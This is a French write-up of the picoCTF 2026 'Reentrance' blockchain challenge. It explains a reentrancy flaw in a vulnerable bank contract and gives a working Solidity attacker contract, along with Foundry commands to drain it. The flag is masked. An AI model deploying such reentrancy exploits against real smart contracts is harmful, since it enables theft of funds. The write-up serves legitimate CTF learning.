# 753 — Reentrance

**Événement** : picoCTF 2026 · **Catégorie** : Blockchain

> Synthèse rédigée à partir des sources publiques listées en fin de fiche : ce challenge a été
> résolu côté CyLab Academy, mais le writeup d'origine n'a pas été conservé.

## Énoncé

> The lead developer at SecureBank Corp is back. He claims he's patched the vault and created the
> ultimate, unhackable Ethereum contract. Your mission: Drain the vault down to 0 and force the
> contract to surrender the flag.

Le contrat `VulnBank.sol` est fourni.

## Analyse

`withdraw()` envoie l'ETH au appelant **avant** de décrémenter son solde : l'ordre
checks-effects-interactions est inversé. Un contrat malveillant peut donc rappeler `withdraw()`
depuis son `receive()` alors que le solde est encore périmé, et vider la banque en boucle. Le
`getFlag()` du contrat ne rend le flag que si le solde de la banque est nul : il faut donc
réellement drainer, puis lire le flag (la lecture directe avant l'attaque ne rend rien ou revert).

## Solution

1. Lire `VulnBank.sol` : `withdraw()` envoie les fonds puis met à jour le solde.
2. Déployer un contrat attaquant qui dépose, lance le retrait, et se rappelle depuis `receive()` :

```solidity
interface IVulnBank { function deposit() external payable; function withdraw(uint256) external;
                      function getFlag() external view returns (string memory); }
contract Attacker {
    IVulnBank public target; uint256 public amount;
    constructor(address t) { target = IVulnBank(t); }
    function attack() external payable { amount = msg.value;
        target.deposit{value: msg.value}(); target.withdraw(msg.value); }
    receive() external payable { if (address(target).balance >= amount) target.withdraw(amount); }
    function getFlag() external view returns (string memory) { return target.getFlag(); }
}
```

3. Déployer et attaquer avec Foundry (`forge script ... --broadcast` ; sans `--broadcast` rien n'est
   envoyé on-chain), puis lire le flag : `cast call <ATTACKER> 'getFlag()(string)' --rpc-url
   <RPC>`.

## Flag

```
picoCTF{UpDaTe_St4ate5_1st_...}
```

Préfixe publié par picoCTF Solutions (suffixe masqué à la source) : le flag complet n'est pas
recopié ici.

## Sources

- [picoCTF Solutions — Reentrance (picoCTF 2026)](https://picoctfsolutions.com/picoctf-2026-reentrance)
- [Kur0Sh1r0 — picoCTF 2026, Blockchain](https://kur0sh1r0.gitbook.io/ctf-writeups/picoctf-2026/blockchain)
